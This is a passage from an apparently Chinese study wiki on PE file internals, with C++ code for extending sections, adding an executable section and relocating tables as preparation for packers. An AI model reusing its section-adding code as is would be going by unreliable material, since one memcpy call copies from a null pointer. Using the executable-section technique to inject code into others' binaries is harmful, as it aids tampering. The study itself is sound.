&quot;); return nullptr; &#125; //更新节表信息 PIMAGE_SECTION_HEADER pSecHdrToLastSection = NewImagePEHeaders.SecHdr + (NewImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//最后一个节表 pSecHdrToLastSection-&gt;SizeOfRawData += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;FileAlignment); pSecHdrToLastSection-&gt;Misc.VirtualSize += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); //pSecHdrToLastSection-&gt;Characteristics //根据需要修改属性 NewImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); printf(&quot; [+] The last section has been extended successfully. &quot;); return lpNewImageBuffer;&#125; 测试 12345678910111213141516171819202122232425262728293031//测试扩大最后一个节int TestExtendTheLastSection()&#123; //用例1：fg.exe 文件对齐=内存对齐 //PEManipulator PEFile(&quot;E:\\\\temp\\\\ExtendTheLastSection\\\\fg.exe&quot;); //用例2：notepad.exe 文件对齐200h 内存对齐1000h PEManipulator PEFile(&quot;E:\\\\temp\\\\ExtendTheLastSection\\ otepad.exe&quot;); if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.FileBufferToImageBuffer(); LPVOID lpNewImageBuffer = PEFile.ExtendTheLastSection(0x870); if (lpNewImageBuffer == nullptr) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] lpNewImageBuffer; &#125;); PEFile.NewImageBufferToNewFileBuffer(lpNewImageBuffer); if (!PEFile.SaveFile(3)) &#123; return 1; &#125; return 0;&#125; 扩大任意节 扩大最后一个节比较简单，如果扩大中间的节，要将后面的节后移，还要修正部分重定位数据，比较麻烦就是了。相关资源如下，先记录，未来有需要再看 扩大.text节：https://github.com/Neo-Maoku/expandTextSection 扩大任意节：https://bbs.kanxue.com/thread-84932.htm"},{"title":"新增节","path":"/wiki/PE/新增节.html","content":"前言 扩大节的问题： 添加的东西和原有的数据混在一起 最后一个节原来是一些只读的数据，如果新加的是代码，还要改节属性 步骤 判断现有的节表后是否有足够的空间新添加一个节表 最后一个节表的后面还要有1个全为0的节表（40个字节）收尾。 虽然没有这个“空节表”或这个空节表里的值不全为0，exe也能正常运行。但最好还是遵守这个规定，windows很多结构体都是以一个全零结构体收尾作为结束标记 所以判断条件是判断剩余空间是否≥（要新增节的数量+1）* 40字节，其中，剩余空间=SizeOfHeaders-DOS部分-PE标识-标准PE头-扩展PE头-现有节表占的空间。例：打算新增1个节，那么剩余空间就要至少剩80个字节，40个字节放新增加的节表，另外40个字节作为收尾的全0节表。 比如winxp下的notepad，编译器在节表后掺了一堆东西，这堆东西可能有用，也可能没用，为了保险我们不去覆盖这些数据。空间不够可以将整个NT头上移，占用DOS Stub数据的空间，然后改e_lfanew字段。如果这种办法也不行（极少情况），只能扩大节了。 在节表中新增一个成员，填写各个字段（可以对着抄.text节的节表的字段） Name：节的名字，随便起 Misc.VirtualSize（内存中的大小，也是对齐前的大小）：直接按对齐后写，不用想实际用到多少。比如可能只用到20个字节，这里直接按对齐SectionAlighment（0x1000）后填，比如0x1000。 VirtualAddress：两种计算方式 计算方式一：节表中最后一个节的VirtualAddress+max{VirtualSize，SizeOfRawData}。如果是VirtualSize&gt;SizeOfRawData，要取VirtualSize按内存对齐后的值 例：倒数第二个节和最后一个节节表部分字段如下： 节 字段 值 最后一个节 VirtualSize 5FD8 VirtualAddress 23000 SizeOfRawData 4000 PointerToRawData 23000 VirtualSize(5FD8)&gt;SizeOfRawData(4000)，新添加的节要从VirtualAddress（23000）+VirtualSize按SectionAlignment对齐后的大小（6000h）=29000h开始放 不过一般情况下最后一个节不是数据区，只有这个节因为含有初始化数据才会导致VirtualSize&gt;SizeOfRawData 计算方式二：SizeOfImage SizeOfRawData（文件中的大小，这个值也是按文件对齐后的大小）：这个值要按文件对齐。比如VirtualAddress写了0x1000，即使文件对齐值是200h，这里也写0x1000。 总之，Misc.VirtualSize和SizeOfRawData都按对齐后写比较方便。 PointerToRawData：节表中最后一个节的PointerToRawData+SizeOfRawData PointerToRelocations：没啥用，填0 PointerToLinenumbers：没啥用，填0 NumberOfRelocations：没啥用，填0 NumberOfLinenumbers：没啥用，填0 Characteristics：看是否需要这个节增加可执行属性 更新PE头中节的数量 更新SizeOfImage的大小 原SizeOfImage+新增节.VirtualSize按内存对齐后的值 在原有数据的最后，新增一个节的数据(内存对齐的整数倍) 笔记参考：滴水三期：day33.1-新增节、扩大节-添加代码 编程实现 因为ImageBuffer的空间是事先申请好的指定大小，没法在尾巴追加。所以在ImageBuffer上操作1-4步，然后新申请大小为原SizeOfImage+扩大的字节数大小的NewImageBuffer，然后将ImageBuffer依次拷到NewImageBuffer。通过这样的方式在尾巴“新增节数据”。 代码是在ImageBuffer上操作，先获取ImageBuffer上相关的PE头指针 1234567891011121314PEHeaders ImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of ImageBuffer failed &quot;, __func__); return FALSE;&#125;printf(&quot; [+] Extract the PE Pointers of ImageBuffer successfully. &quot;);if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125; 判断现有的节表后是否有足够的空间新添加一个节表 判断条件1：剩余空间=SizeOfHeaders-DOS总大小（DOS MZ+Dos Stub）-NT头总大小（NT头+标准PE头+扩展PE头）-节表总大小 是否 &gt; 80。 123456789101112//1、判断现有的节表后是否有足够的空间新添加一个节表// 计算各个部分的大小DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // DOS头的大小（DOS MZ+DOS Stub）DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NT头的总大小DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //节表的总大小 DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders;printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); 空间够就新增节表信息。 剩余空间不够时，要利用Dos Stub的空间，这会出现两种情况。情况一：即使NT头上移完全占用Dos Stub全部的空间，可用空间也不够80字节。 代码实现：实在没法新增节，那么就退出函数。 1234567//dwAvailableSpace + SizeDosStub 的空间 &lt;80，即使上移NT头，空间也不够DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stub块大小if (dwAvailableSpace + SizeDosStub &lt; 80)&#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE;&#125; 上面的判断条件1即使满足（剩余空间&gt;80字节），也不能就开始新加节表，比如winxp下的notepad剩余空间是有的，但编译器在节表后加了一堆数据，我们没办法证明这些数据没有用，所以保险做法是不覆盖。在这种情况下，即使剩余空间&gt;80字节，但因为编译器插入了数据，也算作没有足够的空间新添一个节表。所以当条件1满足时，还要继续加上判断条件2：后面的80字节是否有编译器插入的数据。具体代码就是判断是否节表后的空间是否只包含零。 也遇到过节表结尾的不是全0节表，会有两个40。这种情况没法再进行分类，也进行NT头上移处理 1234// 检查现有节表后的80字节是否全为0，是否有数据BYTE zeroData[80] = &#123; 0 &#125;;BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders;bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; 情况二：通过NT头上移能获得足够的空间。 具体代码：提示输出说空间不够，询问用户是否进行NT头上移操作，用户输入非法的话要重新输入 用户输入小写y、大写Y，回车就进行 用户输入小写n、大写N，就不进行，退出函数 空间不够，询问用户是否上移NT头（带非法输入检查）1234567891011121314151617181920212223242526if (dwAvailableSpace &lt; 80 || !isDataClean)&#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; //...&#125; 算Dos Stub大小并输出这个值。让用户能知道移动的字节数范围[80 - dwAvailableSpace，DosStub块大小]，让用户输要上移多少字节。如果输入非法，要求重输 输出显示能上移NT头的范围并让用户选择上移多少字节（有非法输入检查）1234567891011121314151617// 能将NT头上移多少DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER);printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub);DWORD dwShiftSize;do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125;&#125; while (true); 上移NT头 用memcpy从NT头起拷（NT头总大小+节表大小）大小到（NT头-上移字节数）； 将原节表后shiftSize的字节都置0，因为原来的数据变垃圾数据了，置0（原节表末尾往前算dwShiftSize的字节数置为0） 123//上移NT头memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders);memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area 修改e_lfanew指向新的NT头起始位置 1ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; // Update the e_lfanew to point to the new NT header start 上移NT头的操作完毕后，要重新获取PE相关的头指针，因为NT头有变化。后面要用到这些PE头来新增成员 12// Re-extract pointers due to NT header movementExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders); 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//1、判断现有的节表后是否有足够的空间新添加一个节表// 计算各个部分的大小DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // DOS头的大小（DOS MZ+DOS Stub）DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NT头的总大小DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //节表的总大小 DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders;printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); //dwAvailableSpace + SizeDosStub 的空间 &lt;80，即使上移NT头，空间也不够DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stub块大小if (dwAvailableSpace + SizeDosStub &lt; 80)&#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE;&#125; // 检查现有节表后的80字节是否全为0，是否有数据BYTE zeroData[80] = &#123; 0 &#125;;BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders;bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; if (dwAvailableSpace &lt; 80 || !isDataClean)&#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; // 能将NT头上移多少 printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub); DWORD dwShiftSize; do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125; &#125; while (true); //上移NT头 memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders); memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area // Update the e_lfanew to point to the new NT header start ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; printf(&quot; NT Headers have been shifted up by %lu bytes. &quot;, dwShiftSize); // Re-extract pointers due to NT header movement ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders);&#125; 在节表中新增一个成员，填写各个字段 VirtualSize和SizeOfRawData都写成0x1000严谨点12345678910111213141516//2、在节表中新增一个成员，填写各个字段PIMAGE_SECTION_HEADER pSecHdrToLastSection = ImagePEHeaders.SecHdr + (ImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//最后一个节表 IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; //不重要的那些字段已为0了memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // 注意：最多8个字符，不含NULL终止符 //NewSectionTable.Name = &quot;.NewSec&quot;;NewSectionTable.Misc.VirtualSize = 0x1000; //新增0x1000大小NewSectionTable.VirtualAddress = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage;//NewSectionTable.VirtualAddress = pSecHdrToLastSection-&gt; //计算方法二，需要计算对齐值函数,,To doNewSectionTable.SizeOfRawData = 0x1000; //新增0x1000大小NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData;NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //该块包含执行代码，可读、可写、可执行 PIMAGE_SECTION_HEADER pNewSection = ImagePEHeaders.SecHdr + ImagePEHeaders.PeHdr-&gt;NumberOfSections;memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //将新增的节表追加到最后一个节表后面memcpy(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //再添加一个全为0的节表收尾，作为结束标志假设函数接收一个参数DWORD类型的参数dwSectionSizeInFile，表示新增节的实际大小 那么VirtualSize和SizeOfRawData会变为： 123NewSectionTable.Misc.VirtualSize = dwNewSectionSize; //实际的大小 NewSectionTable.SizeOfRawData = AlignUp(dwNewSectionSize, ImagePEHeaders.OptionalPeHdr-&gt;FileAlignment); //按FileAlignment对齐后的大小 更新SizeOfImage会变为： 1ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(newSectionSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); AlignUp函数是计算一个数离一个对齐值最近的数是多少 123456// This function aligns a given size up // to the nearest multiple of the alignment value.DWORD AlignUp(DWORD dwSize, DWORD dwAlignment) &#123;\treturn (dwSize + dwAlignment - 1) &amp; ~(dwAlignment - 1);&#125; 更新节表数量 12// 3. 更新节表数量++ImagePEHeaders.PeHdr-&gt;NumberOfSections; 更新SizeOfImage的大小 12//4. 更新SizeOfImage的大小ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += NewSectionTable.Misc.VirtualSize; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122BOOL PEManipulator::AddANewSection()&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of ImageBuffer failed &quot;, __func__); return FALSE; &#125; printf(&quot; [+] Extract the PE Pointers of ImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; //1、判断现有的节表后是否有足够的空间新添加一个节表 // 计算各个部分的大小 DWORD SizeDos = ImagePEHeaders.DosHdr-&gt;e_lfanew; // DOS头的大小（DOS MZ+DOS Stub） DWORD SizeNtHdr = sizeof(ImagePEHeaders.NtHdr-&gt;Signature) + IMAGE_SIZEOF_FILE_HEADER + ImagePEHeaders.PeHdr-&gt;SizeOfOptionalHeader; //NT头的总大小 DWORD SizeSectionHeaders = ImagePEHeaders.PeHdr-&gt;NumberOfSections * sizeof(IMAGE_SECTION_HEADER); //节表的总大小 DWORD dwAvailableSpace = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfHeaders - SizeDos - SizeNtHdr - SizeSectionHeaders; printf(&quot; [+] Available space after the last section header: %lu bytes &quot;, dwAvailableSpace); //dwAvailableSpace + SizeDosStub 的空间 &lt;80，即使上移NT头，空间也不够 DWORD SizeDosStub = ImagePEHeaders.DosHdr-&gt;e_lfanew - sizeof(IMAGE_DOS_HEADER); //DOS Stub块大小 if (dwAvailableSpace + SizeDosStub &lt; 80) &#123; printf(&quot; [!] Not enough space to add a new section header even after potential NT header shift. Required: 80 bytes, available: %lu bytes. &quot;, dwAvailableSpace + SizeDosStub); return FALSE; &#125; // 检查现有节表后的80字节是否全为0，是否有数据 BYTE zeroData[80] = &#123; 0 &#125;; BYTE* checkSpace = (BYTE*)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders; bool isDataClean = memcmp(checkSpace, zeroData, 80) == 0; if (dwAvailableSpace &lt; 80 || !isDataClean) &#123; printf(&quot; [!] Not enough space to add a new section header. Required: 80 bytes. &quot;); printf(&quot; [*] Do you want to shift the NT Headers upwards to make space? [Y/n]: &quot;); char cResponse; while (true) &#123; scanf_s(&quot; %c&quot;, &amp;cResponse, 1); if (cResponse == &#x27; &#x27; || cResponse == &#x27;Y&#x27; || cResponse == &#x27;y&#x27;) &#123; cResponse = &#x27;Y&#x27;; break; &#125; else if (cResponse == &#x27;N&#x27; || cResponse == &#x27;n&#x27;) &#123; printf(&quot; Operation cancelled by user. &quot;); return FALSE; &#125; else &#123; printf(&quot; Invalid input. Please enter Y (yes) or N (no): &quot;); &#125; &#125; // 能将NT头上移多少 printf(&quot; Maximum shift size available: %lu bytes &quot;, SizeDosStub); DWORD dwShiftSize; do &#123; printf(&quot; Enter the number of bytes to shift NT Headers (up to %lu bytes, minimum required: %lu): &quot;, SizeDosStub, 80 - dwAvailableSpace); scanf_s(&quot;%lu&quot;, &amp;dwShiftSize); if (dwShiftSize &lt; 80 - dwAvailableSpace || dwShiftSize &gt; SizeDosStub) &#123; printf(&quot; Invalid shift size. Please enter a value within the valid range. &quot;); &#125; else &#123; break; &#125; &#125; while (true); //上移NT头 memcpy((LPBYTE)ImagePEHeaders.NtHdr - dwShiftSize, ImagePEHeaders.NtHdr, SizeNtHdr + SizeSectionHeaders); memset((LPBYTE)ImagePEHeaders.NtHdr + SizeNtHdr + SizeSectionHeaders - dwShiftSize, 0, dwShiftSize); // Clear the old area // Update the e_lfanew to point to the new NT header start ImagePEHeaders.DosHdr-&gt;e_lfanew -= dwShiftSize; printf(&quot; NT Headers have been shifted up by %lu bytes. &quot;, dwShiftSize); // Re-extract pointers due to NT header movement ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders); &#125; //2、在节表中新增一个成员，填写各个字段 PIMAGE_SECTION_HEADER pSecHdrToLastSection = ImagePEHeaders.SecHdr + (ImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//最后一个节表 IMAGE_SECTION_HEADER NewSectionTable = &#123; 0 &#125;; //不重要的那些字段已为0了 memcpy(NewSectionTable.Name, &quot;.NewSec&quot;, 8); // 注意：最多8个字符，不含NULL终止符 //NewSectionTable.Name = &quot;.NewSec&quot;; NewSectionTable.Misc.VirtualSize = 0x1000; //新增0x1000大小 NewSectionTable.VirtualAddress = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage; //NewSectionTable.VirtualAddress = pSecHdrToLastSection-&gt; //计算方法二，需要计算对齐值函数,,To do NewSectionTable.SizeOfRawData = 0x1000; //新增0x1000大小 NewSectionTable.PointerToRawData = pSecHdrToLastSection-&gt;PointerToRawData + pSecHdrToLastSection-&gt;SizeOfRawData; NewSectionTable.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE; //该块包含执行代码，可读、可写、可执行 PIMAGE_SECTION_HEADER pNewSection = ImagePEHeaders.SecHdr + ImagePEHeaders.PeHdr-&gt;NumberOfSections; memcpy(pNewSection, &amp;NewSectionTable, sizeof(IMAGE_SECTION_HEADER)); //将新增的节表追加到最后一个节表后面 memcpy(pNewSection + 1, 0, sizeof(IMAGE_SECTION_HEADER)); //再添加一个全为0的节表收尾，作为结束标志 // 3. 更新节表数量 ++ImagePEHeaders.PeHdr-&gt;NumberOfSections; //4. 更新SizeOfImage的大小 ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += NewSectionTable.Misc.VirtualSize; printf(&quot; [+] A new section has been added successfully. &quot;); return TRUE;&#125; 测试 File-&gt;FileBuffer-&gt;ImageBuffer，在ImageBuffer上新增节表信息，ImageBuffer-&gt;NewImageBuffer-&gt;NewFileBuffer-&gt;存盘 感觉不用那么麻烦，新增一块原SizeOfImage+新的大小，整块对拷，然后改。但也有问题，如果没法改的话，已经申请NewImageBuffer了。 在ImageBuffer上加代码会比较方便。如果仅仅是新增节，可以在FileBuffer上修改相关的信息，然后新增一个Buffer，从FileBuffer拷过去，再存盘即可。 fflush(stdout); 确保在用户看到输入提示之前没有输出缓存的延迟。 scanf(&quot; %c&quot;, &amp;cResponse); 尝试读取一个字符，前面的空格用于忽略任何前导空白字符，包括之前的回车。 如果scanf因用户只按回车而没有读到字符，result将是0。此时可以设置cResponse为’Y’来模拟默认选择。 使用fflush(stdin);在每次循环迭代后清空标准输入，这防止之前的错误输入影响到后续的读取（注意：fflush(stdin);在一些环境中是未定义行为，但在很多编译器上可以正常工作）。如果你的环境中fflush(stdin);是未定义的，你可能需要找到替代方法来清除输入缓冲区。 循环持续直到输入被确认为有效。 scanf_s 要求指定每个接收缓冲区的大小，对于单个字符，我们使用1作为大小。 while (getchar() != ' '); 用来清空输入缓冲区，确保所有之前的错误输入都被清除，这避免了使用fflush(stdin);的不确定性。 AlignUP函数解释： AlignUp函数的实现主要是利用位操作来确保一个给定的数值按照指定的对齐单位向上对齐。下面是函数的解释和逐步说明： AlignUp函数逻辑 123DWORD AlignUp(DWORD size, DWORD alignment) &#123; return (size + alignment - 1) &amp; ~(alignment - 1);&#125; 步骤解释 size + alignment - 1： 这一步的目的是确保在计算对齐的过程中，如果size已经是alignment的倍数，它保持不变；如果不是，它会被增加到下一个alignment的倍数。 例如，如果size是1023（0x3FF），且alignment是1024（0x400），那么size + alignment - 1的结果是0x3FF + 0x3FF = 0x7FE。 alignment - 1： 这个表达式生成一个掩码，该掩码的所有低位都是1，直到alignment的位宽。例如，对于1024 (0x400)，alignment - 1就是0x3FF（即二进制的1111111111）。 ~(alignment - 1)： 对alignment - 1取反得到的掩码在低位是0，在高位是1。继续使用1024作为例子，结果将是FFFFFC00（对于32位操作）。这个掩码用于将任何数清零到最接近的更大的alignment倍数。 使用掩码 &amp;： 将size + alignment - 1的结果与上述掩码进行与操作（&amp;），结果将是最接近的大于等于size的alignment的倍数。这是通过将size + alignment - 1的低位清零实现的。 示例 假设size = 1025 (0x401) 和 alignment = 1024 (0x400)： size + alignment - 1 = 1025 + 1023 = 2048 (0x800) ~(alignment - 1) = ~(1023) = FFFFFC00 (size + alignment - 1) &amp; ~(alignment - 1) = 0x800 &amp; FFFFFC00 = 0x800 所以，如果你传入1025为size和1024为alignment，AlignUp将返回2048，这是大于1025的最小的1024的倍数。 希望这样的解释有助于理解AlignUp函数的内部逻辑！如果还有其他问题，请继续提问。"},{"title":"练习","path":"/wiki/PE/练习_PE.html","content":"用十六进制文本编辑器，打开一个位于磁盘上的notepad.exe文件，再打开一个在内存中的notepad进程，观察这两个文件的不同 过程环境：win7 x86，WinHex_x86。win10不知道为啥WinHex，Open RAM找不到notepad数据绝大多数一样磁盘上的notepad起始offset是0，内存中的是D00000h磁盘上的notepad.exe在内存运行的notepad.exe内存占用192KB，磁盘占用176KB。内存中填充的0更多，第一个节数据从1000h开始。硬盘上的是从400h开始。磁盘上的notepad.exe在内存运行的notepad.exe PE文件为什么要分节？ 答案在程序多次运行时能够共享某些数据，以此来节约内存资源。以QQ程序为例，假设它包含两种不同的数据节：第1个数据节：只读第2个数据节：可读可写当用户第一次打开QQ时，QQ.exe会被加载到其4GB的进程空间内，包含上述两个节。如果用户想再次打开一个QQ，系统会再次加载QQ.exe。但是，因为第一个数据节是只读的，第二个QQ实例无需重新加载这个节，它可以使用已经加载到内存中的第一个节的数据。这样，无论启动多少个QQ实例，第一个数据节都只需加载一次，并且可以被所有QQ进程共享。这种方式有效地节约了内存的使用。 使用PE Tool查看一个exe的节表信息，用十六进制编辑器查看该exe节数据的起始地址和大小是否与节表中的字段一致 答案是一样的 123"},{"title":"移动各种表","path":"/wiki/PE/移动各种表.html","content":"前言 在编译PE文件时，编译器会生成一些关键的表，比如导入表、导出表和重定位表等。当系统加载器将PE文件加载到进程空间时，它需要用到这些表的信息来进行初始化工作。例如，系统加载器使用重定位表来修正重定位数据，使用导出表来修正导入表中的地址指向。 PE文件保护的一种常见方法是使用“壳”。当执行一个被加壳的exe文件时，首先运行的是壳的代码。例如，双击一个exe可能会弹出一个要求输入激活码的窗口；只有在输入正确的激活码后，程序才会继续执行原始的入口点（OEP）并运行真正的程序。 如果想对程序进行保护，可以加密exe文件中的二进制数据。但如果直接加密整个节的数据，那么当系统加载器尝试根据数据目录表中的RVA地址定位到导入表、导出表、重定位表时，它会遇到加密数据，从而无法完成初始化工作。 PE文件通常按节划分，每个节按其属性区分，包含数据和可能的表信息。换句话说，表信息和数据共同存放在节中，表信息没有单独分离存放。为了在加密数据的同时确保系统加载器仍能得到这些表信息，必须将这些表信息移动到某个位置，然后再对原始数据进行加密。例如，新增一个节，将所有需要的表信息移动到这个新节中。之后，对原始数据进行加密，更新数据目录表中的RVA地址指向表信息的新位置。这样，当系统加载器加载PE文件时，依然可以访问到这些表的信息。因此，学习如何移动这些表是掌握程序加密/解密技术的基础。 对PE文件加密是指对节数据加密，PE头部的字段不能加密（可以变形，参考tinype），这些字段系统加载器要用。 移动重定位表 要拷贝的内容有：所有重定位块 统计整个重定位块的大小，然后拷贝到新节起始位置 更新数据目录表中重定位表RVA地址的指向 程序流程设计： 获得dll文件的m_lpFileBuffer文件内存映像（未拉伸），获取相关PE指针 对m_lpFileBuffer新增大小为0x2000的节，返回出lpNewBuffer（未拉伸） 在lpNewBuffer上移动重定位数据到新节 具体做法是： 指向重定位块后，循环遍历得到重定位块的大小（包括结尾的8字节全0结构体） 拷贝到新节 更新数据目录项中重定位表的RVA地址指向 将lpNewBuffer存盘 检验办法：Beyond Compare比对两个文件的十六进制 更严谨的话要修改ImageBase看移动后的dll文件能否正常使用。但因为移动重定位表比较简单，这里就是用BC对比下十六进制。 测试函数 大致流程12345678910111213141516171819202122232425262728293031323334353637//测试移动重定位表int TestRemoveRelocationTable()&#123; //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VC的 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; //新增节 LPVOID lpNewBuffer = PEFile.AddANewSection(0x2000); //新节直接0x2000，也可以先算一遍，按需新增节的大小 if (!lpNewBuffer) &#123; return 1; &#125; INVOKE_ON_EXIT([&amp;] &#123; delete[] 